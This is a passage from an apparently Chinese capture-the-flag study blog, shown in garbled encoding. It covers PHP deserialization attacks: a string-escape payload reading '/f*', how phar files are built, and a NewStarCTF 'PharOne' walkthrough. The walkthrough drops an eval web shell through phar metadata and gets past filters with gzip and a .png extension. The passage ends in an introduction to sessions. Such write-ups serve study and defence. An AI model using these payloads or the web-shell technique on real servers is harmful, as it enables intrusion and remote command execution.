class="string">&quot;cmd&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;whoami&quot;</span>;&#125;è¿™æ˜¯ä¼ å…¥ä¸€ä¸ªbadçš„åºåˆ—åŒ–çš„å†…å®¹ï¼Œç°åœ¨æˆ‘ä»¬ä¸æƒ³æ‰§è¡Œwhoamiè¿™ä¸ªå‘½ä»¤ï¼Œå°±è¦æŠŠ;s:<span class="number">3</span>:<span class="string">&quot;cmd&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;whoami&quot;</span>;&#125;ç»™é¡¶å‡ºå»ã€‚</span><br><span class="line">ç›®çš„å­—ç¬¦ä¸²ï¼šO:<span class="number">7</span>:<span class="string">&quot;GetFlag&quot;</span>:<span class="number">2</span>ï¼š&#123;s:<span class="number">3</span>:<span class="string">&quot;key&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;bad&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;cmd&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;ls&quot;</span>;&#125;<span class="string">&quot;;s:3:&quot;</span>cmd<span class="string">&quot;;s:6:&quot;</span>whoami<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string">&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;cmd&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;ls&quot;</span>;&#125;æœ‰<span class="number">22</span>ä¸ªå­—ç¬¦ï¼Œç„¶åæŠŠ<span class="number">22</span>ä¸ªbadæ›¿æ¢æ‰åï¼Œå°±æ˜¯å¢åŠ äº†<span class="number">22</span>ä¸ªå­—ç¬¦ï¼Œé‚£ä¹ˆlså°±å¯ä»¥æ‰§è¡Œ</span><br><span class="line">å½“å‰ç›®å½•ä¸‹æ²¡æœ‰ï¼Œç›´æ¥æŸ¥æ ¹ç›®å½•ï¼ŒåŸç†ä¸€æ ·</span><br><span class="line">?key=badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad<span class="string">&quot;;s:3:&quot;</span>cmd<span class="string">&quot;;s:7:&quot;</span>cat /f*<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure><h2 id="pharååºåˆ—åŒ–"><a href="#pharååºåˆ—åŒ–" class="headerlink" title="pharååºåˆ—åŒ–"></a>pharååºåˆ—åŒ–</h2><h4 id="ä»€ä¹ˆæ˜¯pharæ–‡ä»¶"><a href="#ä»€ä¹ˆæ˜¯pharæ–‡ä»¶" class="headerlink" title="ä»€ä¹ˆæ˜¯pharæ–‡ä»¶"></a>ä»€ä¹ˆæ˜¯pharæ–‡ä»¶</h4><p>pharæ–‡ä»¶å°±æ˜¯ç±»ä¼¼äºjavaçš„jarçš„é‚£ç§ç±»å‹çš„å‹ç¼©æ–‡ä»¶ï¼Œå®ƒå¯ä»¥å°†å¤šä¸ªphpæ–‡ä»¶çš„ä»£ç å‹ç¼©æˆä¸€ä¸ªpharï¼Œæ— éœ€è§£å‹ï¼ŒPHPå°±å¯ä»¥è¿›è¡Œè®¿é—®å¹¶æ‰§è¡Œå†…éƒ¨è¯­å¥ã€‚</p><h4 id="pharæ–‡ä»¶ç»“æ„"><a href="#pharæ–‡ä»¶ç»“æ„" class="headerlink" title="pharæ–‡ä»¶ç»“æ„"></a>pharæ–‡ä»¶ç»“æ„</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>. stub <span class="comment">//pharæ–‡ä»¶å¤´</span></span><br><span class="line">    pharæ–‡ä»¶çš„æ ‡å¿—ï¼Œä¹Ÿå¯ä»¥ç†è§£ä¸ºpharçš„æ–‡ä»¶å¤´</span><br><span class="line">    è¿™ä¸ªStubå…¶å®å°±æ˜¯ä¸€ä¸ªç®€å•çš„PHPæ–‡ä»¶ï¼Œå¿…é¡»æ˜¯ xxx<span class="meta">&lt;?php</span> xxx; <span class="title function_ invoke__">__HALT_COMPILER</span>();<span class="meta">?&gt;</span> è¿™ç§æ ¼å¼ï¼Œå¿…é¡»æœ‰<span class="title function_ invoke__">__HALT_COMPILER</span>()ï¼Œæ²¡æœ‰è¿™ä¸ªï¼ŒPHPå°±æ— æ³•è¯†åˆ«å‡ºå®ƒæ˜¯Pharæ–‡ä»¶ã€‚å…¶ä»–çš„æ— æ‰€è°“ã€‚</span><br><span class="line"><span class="number">2</span>. manifest <span class="comment">//å‹ç¼©æ–‡ä»¶çš„ä¿¡æ¯</span></span><br><span class="line">    pharæ–‡ä»¶æœ¬è´¨ä¸Šæ˜¯ä¸€ç§å‹ç¼©æ–‡ä»¶ï¼Œå…¶ä¸­æ¯ä¸ªè¢«å‹ç¼©æ–‡ä»¶çš„æƒé™ã€å±æ€§ç­‰ä¿¡æ¯éƒ½æ”¾åœ¨è¿™éƒ¨åˆ†ã€‚è¿™éƒ¨åˆ†è¿˜ä¼šä»¥åºåˆ—åŒ–çš„å½¢å¼å­˜å‚¨ç”¨æˆ·è‡ªå®šä¹‰çš„meta-dataï¼Œè¿™ä¸ªmeta-dataå°±æ˜¯ç”¨æˆ·è‡ªå·±å®šä¹‰çš„å…ƒæ•°æ®ï¼Œåœ¨è¿™é‡Œç”¨æˆ·è‡ªå®šä¹‰çš„å…ƒæ•°æ®å°±æ˜¯ä»¥åºåˆ—åŒ–çš„å½¢å¼å­˜åœ¨çš„ï¼Œè¿™æ˜¯æ¼æ´åˆ©ç”¨æœ€æ ¸å¿ƒçš„åœ°æ–¹ã€‚å¦‚ä¸‹å›¾ã€‚</span><br></pre></td></tr></table></figure><p><img src="C:\Users\æ¨æ²›æ¬£\AppData\Roaming\Typora\typora-user-images\image-20240716105756715.png" alt="image-20240716105756715"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">3</span>. content <span class="comment">//å‹ç¼©æ–‡ä»¶çš„å†…å®¹</span></span><br><span class="line">    è¢«å‹ç¼©æ–‡ä»¶çš„å†…å®¹</span><br><span class="line"><span class="number">4</span>. <span class="title function_ invoke__">signature</span> (å¯ç©º) <span class="comment">//ç­¾å</span></span><br><span class="line">    ç­¾åï¼Œæ”¾åœ¨æœ«å°¾ã€‚</span><br></pre></td></tr></table></figure><h4 id="pharååºåˆ—åŒ–-1"><a href="#pharååºåˆ—åŒ–-1" class="headerlink" title="pharååºåˆ—åŒ–"></a>pharååºåˆ—åŒ–</h4><p>Pharä¹‹æ‰€ä»¥èƒ½ååºåˆ—åŒ–ï¼Œæ˜¯å› ä¸ºPharæ–‡ä»¶ä¼šä»¥åºåˆ—åŒ–çš„å½¢å¼å­˜å‚¨ç”¨æˆ·è‡ªå®šä¹‰çš„<code>meta-data</code>,PHPä½¿ç”¨<code>phar_parse_metadata</code>åœ¨è§£æmetaæ•°æ®æ—¶ï¼Œä¼šè°ƒç”¨<code>php_var_unserialize</code>è¿›è¡Œååºåˆ—åŒ–æ“ä½œã€‚</p><h4 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1ã€pharæ–‡ä»¶èƒ½å¤Ÿä¸Šä¼ è‡³æœåŠ¡å™¨</span><br><span class="line">2ã€è¦æœ‰å¯æ§çš„å‚æ•°ï¼Œåƒå…ƒæ•°æ®é‚£ç§ï¼Œå¹¶ä¸”ã€/ã€pharç­‰ç‰¹æ®Šå­—ç¬¦æ²¡æœ‰è¢«è¿‡æ»¤</span><br><span class="line">3ã€php.iniä¸­çš„phar.readonlyé€‰é¡¹ï¼Œéœ€è¦ä¸ºOffï¼ˆé»˜è®¤æ˜¯onï¼‰ã€‚</span><br></pre></td></tr></table></figure><h4 id="ç”Ÿæˆpharæ–‡ä»¶"><a href="#ç”Ÿæˆpharæ–‡ä»¶" class="headerlink" title="ç”Ÿæˆpharæ–‡ä»¶"></a>ç”Ÿæˆpharæ–‡ä»¶</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>=<span class="string">&quot;qwq&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> `cmd`;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Flag</span>(); <span class="comment">//åˆ›å»ºä¸€ä¸ªflagçš„å¯¹è±¡</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;A.phar&#x27;</span>); <span class="comment">//åˆ›å»ºä¸€ä¸ªpharå¯¹è±¡ï¼Œè¿™ä¸€è¡Œä»£ç åˆ›å»ºäº†ä¸€ä¸ªæ–°çš„ Phar å¯¹è±¡ã€‚Phar æ˜¯ PHP ä¸­ç”¨äºåˆ›å»ºå’Œæ“ä½œ PHP å½’æ¡£æ–‡ä»¶ï¼ˆPHAR æ–‡ä»¶ï¼‰çš„ä¸€ä¸ªç±»ã€‚</span></span><br><span class="line"><span class="comment">//åŠŸèƒ½ï¼šnew Phar(&quot;phar.phar&quot;)  æ–‡ä»¶ååç¼€å¿…é¡»æ˜¯phar</span></span><br><span class="line"><span class="comment">//å‚æ•°ï¼š&quot;phar.phar&quot; æ˜¯æ­£åœ¨åˆ›å»ºæˆ–æ‰“å¼€çš„ PHAR æ–‡ä»¶çš„åç§°ã€‚å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ™ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„æ–‡ä»¶ã€‚</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>(); <span class="comment">//å¼€å¯ç¼“å­˜ï¼Œåœ¨ Phar å¯¹è±¡ä¸Šè°ƒç”¨ startBuffering() æ–¹æ³•å¯ä»¥ç¡®ä¿æ‰€æœ‰çš„æ›´æ”¹åœ¨å®é™…å†™å…¥æ–‡ä»¶ä¹‹å‰éƒ½ä¼šå…ˆè¢«ç¼“å†²ã€‚è¿™æ„å‘³ç€åœ¨ stopBuffering() ä¹‹å‰çš„æ‰€æœ‰æ“ä½œéƒ½ä¸ä¼šç«‹å³ç”Ÿæ•ˆï¼Œè€Œæ˜¯æš‚æ—¶å­˜å‚¨åœ¨å†…å­˜ä¸­ã€‚</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>); <span class="comment">//å‘ PHAR æ–‡ä»¶ä¸­æ·»åŠ ä¸€ä¸ªæ–°çš„æ–‡ä»¶ã€‚addFromString æ–¹æ³•ç”¨äºä»å­—ç¬¦ä¸²å†…å®¹åˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¹¶å°†å…¶æ·»åŠ åˆ° PHAR æ–‡ä»¶ä¸­ã€‚&quot;test.txt&quot; æ˜¯æ–‡ä»¶åï¼Œ&quot;test&quot; æ˜¯æ–‡ä»¶å†…å®¹ã€‚è¿™ä¸€è¡Œä»£ç å¹¶ä¸æ˜¯å¿…é¡»çš„ã€‚å®ƒçš„ä½œç”¨æ˜¯å‘ PHAR æ–‡ä»¶ä¸­æ·»åŠ ä¸€ä¸ªåä¸º test.txt çš„æ–‡ä»¶ï¼Œå¹¶å°†å…¶å†…å®¹è®¾ç½®ä¸º &quot;test&quot;ã€‚å¦‚æœä½ ä¸éœ€è¦å‘ PHAR æ–‡ä»¶ä¸­æ·»åŠ ä»»ä½•æ–‡ä»¶ï¼Œè¿™ä¸€è¡Œä»£ç å¯ä»¥çœç•¥ã€‚</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>); <span class="comment">//è¿™ä¸€è¡Œä»£ç è®¾ç½®äº† PHAR æ–‡ä»¶çš„å­˜æ ¹ï¼ˆstubï¼‰ã€‚setStub æ–¹æ³•ç”¨äºå®šä¹‰ PHAR æ–‡ä»¶çš„å…¥å£ä»£ç ã€‚&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot; æ˜¯ä¸€ä¸ª PHP æŒ‡ä»¤ï¼Œè¡¨ç¤ºåœæ­¢ç¼–è¯‘å™¨ã€‚æ­¤ä»£ç åœ¨ PHAR æ–‡ä»¶æ‰§è¡Œæ—¶é¦–å…ˆè¿è¡Œã€‚æœ‰æ—¶å€™ä¼šæœ‰æ–‡ä»¶å¤´æ£€æµ‹ï¼Œå¦‚æœæœ‰æ–‡ä»¶å¤´æ£€æµ‹å¯ä»¥åŠ ä¸Šæ–‡ä»¶å¤´</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);<span class="comment">//è®¾ç½®å…ƒæ•°æ®ï¼ŒsetMetadata æ–¹æ³•ç”¨äºç»™ PHAR æ–‡ä»¶æ·»åŠ å…ƒæ•°æ®ã€‚è¿™é‡Œå°† TestObject å¯¹è±¡ $a ä½œä¸ºå…ƒæ•°æ®æ·»åŠ åˆ° PHAR æ–‡ä»¶ä¸­ã€‚</span></span><br><span class="line"><span class="comment">//è‡ªåŠ¨è®¡ç®—ç­¾å</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>(); <span class="comment">//è¿™ä¸€è¡Œä»£ç åœæ­¢ç¼“å†²æ“ä½œå¹¶å°†æ‰€æœ‰ç¼“å†²çš„æ›´æ”¹å†™å…¥ PHAR æ–‡ä»¶ã€‚stopBuffering æ–¹æ³•ä¼šå°†ä¹‹å‰ç¼“å†²çš„æ‰€æœ‰æ›´æ”¹å®é™…å†™å…¥åˆ° PHAR æ–‡ä»¶ä¸­ï¼Œä½¿æ›´æ”¹ç”Ÿæ•ˆã€‚</span></span><br></pre></td></tr></table></figure><p>ä¸è¿‡å¦‚æœphp.iniçš„phar.readonlyå¤„äºonçŠ¶æ€çš„è¯ï¼Œæ˜¯ä¸å…è®¸ç”Ÿæˆpharæ–‡ä»¶çš„ï¼Œcmdæ‰§è¡Œphp â€“iniï¼Œå°±å¯ä»¥æ‰¾åˆ°è¿™ä¸ªphp.iniçš„æ–‡ä»¶è·¯å¾„ï¼Œå°†php.inié‡Œé¢çš„<code>phar.readonly</code>é€‰é¡¹è®¾ç½®ä¸º<code>Off</code>ã€‚<code>å¹¶æŠŠåˆ†å·å»æ‰ã€‚</code></p><h3 id="ç¤ºä¾‹-2"><a href="#ç¤ºä¾‹-2" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h3><h3 id="å°è¯•ç‰›åˆ€â€”â€“-NewStarCTF-2023-å…¬å¼€èµ›é“-PharOne"><a href="#å°è¯•ç‰›åˆ€â€”â€“-NewStarCTF-2023-å…¬å¼€èµ›é“-PharOne" class="headerlink" title="å°è¯•ç‰›åˆ€â€”â€“[NewStarCTF 2023 å…¬å¼€èµ›é“]PharOne"></a>å°è¯•ç‰›åˆ€â€”â€“[NewStarCTF 2023 å…¬å¼€èµ›é“]PharOne</h3><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407160957424.png" alt="img"></p><p>æŸ¥çœ‹æºç ï¼Œå¾—åˆ°æç¤ºï¼Œ&#x2F;class.php</p><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407161000091.png" alt="img"></p><p>è®¿é—®çœ‹åˆ°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        @<span class="title function_ invoke__">exec</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]); </span><br></pre></td></tr></table></figure><p>é‚£æˆ‘ä»¬å°±è”æƒ³åˆ°äº†ï¼Œä¸Šä¼ pharæ–‡ä»¶ï¼Œpharåè®®è¾“å‡ºï¼Œè¿›è¡Œååºåˆ—åŒ–</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;echo &#x27;&lt;?=eval(\$_GET[1]);?&gt;&#x27;&gt;/var/www/html/1.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Flag</span>(); <span class="comment">//åˆ›å»ºä¸€ä¸ªflagçš„å¯¹è±¡</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;A.phar&#x27;</span>); <span class="comment">//åˆ›å»ºä¸€ä¸ªpharå¯¹è±¡ï¼Œè¿™ä¸€è¡Œä»£ç åˆ›å»ºäº†ä¸€ä¸ªæ–°çš„ Phar å¯¹è±¡ã€‚Phar æ˜¯ PHP ä¸­ç”¨äºåˆ›å»ºå’Œæ“ä½œ PHP å½’æ¡£æ–‡ä»¶ï¼ˆPHAR æ–‡ä»¶ï¼‰çš„ä¸€ä¸ªç±»ã€‚</span></span><br><span class="line"><span class="comment">//åŠŸèƒ½ï¼šnew Phar(&quot;phar.phar&quot;)  æ–‡ä»¶ååç¼€å¿…é¡»æ˜¯phar</span></span><br><span class="line"><span class="comment">//å‚æ•°ï¼š&quot;phar.phar&quot; æ˜¯æ­£åœ¨åˆ›å»ºæˆ–æ‰“å¼€çš„ PHAR æ–‡ä»¶çš„åç§°ã€‚å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ™ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„æ–‡ä»¶ã€‚</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>(); <span class="comment">//å¼€å¯ç¼“å­˜ï¼Œåœ¨ Phar å¯¹è±¡ä¸Šè°ƒç”¨ startBuffering() æ–¹æ³•å¯ä»¥ç¡®ä¿æ‰€æœ‰çš„æ›´æ”¹åœ¨å®é™…å†™å…¥æ–‡ä»¶ä¹‹å‰éƒ½ä¼šå…ˆè¢«ç¼“å†²ã€‚è¿™æ„å‘³ç€åœ¨ stopBuffering() ä¹‹å‰çš„æ‰€æœ‰æ“ä½œéƒ½ä¸ä¼šç«‹å³ç”Ÿæ•ˆï¼Œè€Œæ˜¯æš‚æ—¶å­˜å‚¨åœ¨å†…å­˜ä¸­ã€‚</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>); <span class="comment">//å‘ PHAR æ–‡ä»¶ä¸­æ·»åŠ ä¸€ä¸ªæ–°çš„æ–‡ä»¶ã€‚addFromString æ–¹æ³•ç”¨äºä»å­—ç¬¦ä¸²å†…å®¹åˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¹¶å°†å…¶æ·»åŠ åˆ° PHAR æ–‡ä»¶ä¸­ã€‚&quot;test.txt&quot; æ˜¯æ–‡ä»¶åï¼Œ&quot;test&quot; æ˜¯æ–‡ä»¶å†…å®¹ã€‚è¿™ä¸€è¡Œä»£ç å¹¶ä¸æ˜¯å¿…é¡»çš„ã€‚å®ƒçš„ä½œç”¨æ˜¯å‘ PHAR æ–‡ä»¶ä¸­æ·»åŠ ä¸€ä¸ªåä¸º test.txt çš„æ–‡ä»¶ï¼Œå¹¶å°†å…¶å†…å®¹è®¾ç½®ä¸º &quot;test&quot;ã€‚å¦‚æœä½ ä¸éœ€è¦å‘ PHAR æ–‡ä»¶ä¸­æ·»åŠ ä»»ä½•æ–‡ä»¶ï¼Œè¿™ä¸€è¡Œä»£ç å¯ä»¥çœç•¥ã€‚</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>); <span class="comment">//è¿™ä¸€è¡Œä»£ç è®¾ç½®äº† PHAR æ–‡ä»¶çš„å­˜æ ¹ï¼ˆstubï¼‰ã€‚setStub æ–¹æ³•ç”¨äºå®šä¹‰ PHAR æ–‡ä»¶çš„å…¥å£ä»£ç ã€‚&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot; æ˜¯ä¸€ä¸ª PHP æŒ‡ä»¤ï¼Œè¡¨ç¤ºåœæ­¢ç¼–è¯‘å™¨ã€‚æ­¤ä»£ç åœ¨ PHAR æ–‡ä»¶æ‰§è¡Œæ—¶é¦–å…ˆè¿è¡Œã€‚æœ‰æ—¶å€™ä¼šæœ‰æ–‡ä»¶å¤´æ£€æµ‹ï¼Œå¦‚æœæœ‰æ–‡ä»¶å¤´æ£€æµ‹å¯ä»¥åŠ ä¸Šæ–‡ä»¶å¤´</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);<span class="comment">//è®¾ç½®å…ƒæ•°æ®ï¼ŒsetMetadata æ–¹æ³•ç”¨äºç»™ PHAR æ–‡ä»¶æ·»åŠ å…ƒæ•°æ®ã€‚è¿™é‡Œå°† TestObject å¯¹è±¡ $a ä½œä¸ºå…ƒæ•°æ®æ·»åŠ åˆ° PHAR æ–‡ä»¶ä¸­ã€‚</span></span><br><span class="line"><span class="comment">//è‡ªåŠ¨è®¡ç®—ç­¾å</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>(); <span class="comment">//è¿™ä¸€è¡Œä»£ç åœæ­¢ç¼“å†²æ“ä½œå¹¶å°†æ‰€æœ‰ç¼“å†²çš„æ›´æ”¹å†™å…¥ PHAR æ–‡ä»¶ã€‚stopBuffering æ–¹æ³•ä¼šå°†ä¹‹å‰ç¼“å†²çš„æ‰€æœ‰æ›´æ”¹å®é™…å†™å…¥åˆ° PHAR æ–‡ä»¶ä¸­ï¼Œä½¿æ›´æ”¹ç”Ÿæ•ˆã€‚</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¯¹__HALT_COMPILER()æœ‰è¿‡æ»¤ï¼Œæ‰€ä»¥é€šè¿‡gzipå‘½ä»¤ç»•è¿‡ï¼Œå› ä¸ºåªèƒ½ä¸Šä¼ å›¾ç‰‡ï¼Œæ‰€ä»¥ä¿®æ”¹åç¼€ä¸º.png</p><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407161036193.png"></p><p>ä¸Šä¼ aa.png</p><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407161039957.png"></p><p>åœ¨class.phpä¸‹pharè¯»å–ï¼Œè¿›è¡Œååºåˆ—åŒ–</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=phar:<span class="comment">///var/www/html/upload/321532365639f31b3b9f8ea8be0c6be2.png </span></span><br></pre></td></tr></table></figure><p>è®¿é—®&#x2F;1.phpï¼ŒGETä¼ å‚æ‰§è¡Œå‘½ä»¤</p><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407161043057.png" alt="img"></p><h2 id="SESSIONçš„æ¦‚å¿µ"><a href="#SESSIONçš„æ¦‚å¿µ" class="headerlink" title="SESSIONçš„æ¦‚å¿µ"></a>SESSIONçš„æ¦‚å¿µ</h2><p><code>Session</code>ä¸€èˆ¬ç§°ä¸ºâ€œä¼šè¯æ§åˆ¶â€œï¼Œç®€å•æ¥è¯´å°±æ˜¯æ˜¯ä¸€ç§å®¢æˆ·ä¸ç½‘ç«™&#x2F;æœåŠ¡å™¨æ›´ä¸ºå®‰å…¨çš„å¯¹è¯æ–¹å¼ã€‚ä¸€æ—¦å¼€å¯äº† <code>session</code> ä¼šè¯ï¼Œä¾¿å¯ä»¥åœ¨ç½‘ç«™çš„ä»»ä½•é¡µé¢ä½¿ç”¨æˆ–ä¿æŒè¿™ä¸ªä¼šè¯ï¼Œä»è€Œè®©è®¿é—®è€…ä¸ç½‘ç«™ä¹‹é—´å»ºç«‹äº†ä¸€ç§â€œå¯¹è¯â€æœºåˆ¶ã€‚å› ä¸ºHTTPåè®®æ˜¯æ— çŠ¶æ€çš„ï¼Œé‚£å¦‚ä½•è¾¨åˆ«â€œä½ æ˜¯ä½ â€å‘¢ï¼Œé‚£å°±ç”¨åˆ°äº†sessionï¼Œé€šè¿‡cookieä¸­çš„sessionæ¥è¿›è¡Œç”¨æˆ·è¿½è¸ªã€‚</p><h2 id="SESSIONçš„å·¥ä½œåŸç†"><a href="#SESSIONçš„å·¥ä½œåŸç†" class="headerlink" title="SESSIONçš„å·¥ä½œåŸç†"></a>SESSIONçš„å·¥ä½œåŸç†</h2><p>å½“æˆ‘ä»¬å¼€å¯ä¸€ä¸ªsessionä¼šè¯æ—¶ï¼Œé¦–å…ˆphpä¼šå…ˆæŸ¥æ‰¾session_idï¼Œå¦‚æœåœ¨è¯·æ±‚çš„cookieä¸­ï¼ŒæœåŠ¡å™¨æ²¡æœ‰åœ¨GETæˆ–è€…POSTè¯·æ±‚æ–¹å¼ä¸­æ‰¾åˆ°session_idï¼Œé‚£ä¹ˆè¿™ä¸ªæ—¶å€™phpå°±ä¼šè°ƒç”¨php_session_create_idå‡½æ•°æ¥åˆ›å»ºä¸€ä¸ªæ–°çš„ä¼šè¯ï¼Œåœ¨http-responseä¸­é€šè¿‡set-cookieå¤´éƒ¨å‘é€ç»™å®¢æˆ·ç«¯ï¼Œsessionåœ¨å®¢æˆ·ç«¯ä¿å­˜ã€‚</p><p><strong>session_start()å‡½æ•°</strong></p><p>ä¸Šé¢è¯´äº†sessionçš„åˆ›å»ºï¼Œé‚£ä¹ˆä¸‹é¢æˆ‘ä»¬å°±è¦è¯´ä¸€ä¸‹sessionçš„åˆ›å»ºè¿‡ç¨‹ï¼Œæˆ‘ä»¬å…ˆæ¥çœ‹ä¸€ä¸‹session_statrt()è¿™ä¸ªå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°çš„ä½œç”¨æ˜¯å¼€å¯ä¼šè¯ï¼Œåˆå§‹åŒ–sessionæ•°æ®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ 